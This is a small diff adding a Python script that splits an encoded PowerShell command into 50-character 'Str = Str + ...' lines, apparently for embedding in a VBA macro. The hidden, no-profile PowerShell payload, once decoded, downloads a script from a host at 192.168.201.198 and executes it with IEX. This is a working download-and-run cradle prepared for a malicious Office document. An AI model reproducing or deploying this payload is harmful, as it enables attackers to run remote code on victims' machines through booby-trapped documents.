@@ -1,0 +1,4 @@
+str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKABoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAyADAAMQAuADEAOQA4AC8AUABTAC4AcABzADEAKQA7AAoA"
+n = 50
+for i in range(0, len(str), n):
+        print("Str = Str + " + '"' + str[i:i+n] + '"')
